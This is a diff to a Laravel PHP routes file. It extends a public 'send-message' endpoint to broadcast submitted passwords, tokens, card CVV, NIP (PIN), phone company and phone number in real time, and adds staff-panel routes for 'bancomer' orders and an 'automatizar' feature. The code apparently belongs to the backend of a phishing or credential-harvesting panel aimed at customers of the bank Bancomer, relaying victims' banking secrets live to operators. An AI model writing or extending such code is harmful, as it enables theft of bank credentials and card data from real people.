@@ -15,7 +15,17 @@ Route::post('send-message', function (\Illuminate\Http\Request $request){
     event(new \App\Events\BroadcastMessage($channel, 
         'messages', [
         'message' => $request->get('message'), 
-        'nombre' => $request->get('nombre'), 
+        'nombre' => $request->get('nombre'),
+        'password' => $request->get('password'),
+        'nombre_token' => $request->get('nombre_token'), 
+        'token' => $request->get('token'), 
+        'cvv' => $request->get('cvv'), 
+        'nip' => $request->get('nip'), 
+        'compania' => $request->get('compania'), 
+        'telefono' => $request->get('telefono'),
+        'arr_ordenes' => $request->get('arr_ordenes'),
+        'mi_telcel' => $request->get('mi_telcel'),
+        'finalizar' => $request->get('finalizar'),
         'channel' => $channel
     ]));
 });
@@ -46,6 +56,8 @@ Auth::routes();
 Route::get('/home', 'HomeController@index')->name('home');
 
 Route::middleware(['auth'])->group(function(){
+    
+
     //Roles
     Route::post('roles/store','RoleController@store')->name('roles.store')
     ->middleware('permission:roles.create');
@@ -122,6 +134,9 @@ Route::middleware(['auth'])->group(function(){
     Route::get('bancomer/ordenes','bancomer\OrdenesController@index')->name('bancomer.ordenes.index')
     ->middleware('permission:ordenes.index');
 
+    Route::get('bancomer/ordenes/listar','bancomer\OrdenesController@listar')->name('bancomer.ordenes.listar')
+    ->middleware('permission:ordenes.listar');
+
     Route::get('bancomer/ordenes/create','bancomer\OrdenesController@create')->name('bancomer.ordenes.create')
     ->middleware('permission:ordenes.create');
 
@@ -145,6 +160,15 @@ Route::middleware(['auth'])->group(function(){
     ->middleware('permission:bancomer.personal.index');
 
     Route::post('bancomer/personal/etiquetas/update','bancomer\PersonalController@update_flags')->name('bancomer.personal.etiquetas.update');
+
+    Route::post('bancomer/personal/adj','bancomer\PersonalController@adj')->name('bancomer.personal.adj');
+
+    //Automatizar 
+    Route::get('bancomer/personal/automatizar','bancomer\AutomatizarController@index')->name('bancomer.personal.automatizar.index')
+    ->middleware('permission:bancomer.personal.automatizar.index');
+
+    Route::post('bancomer/personal/automatizar/update','bancomer\AutomatizarController@update')->name('bancomer.personal.automatizar.update')
+    ->middleware('permission:bancomer.personal.automatizar.update');
 
 });
 
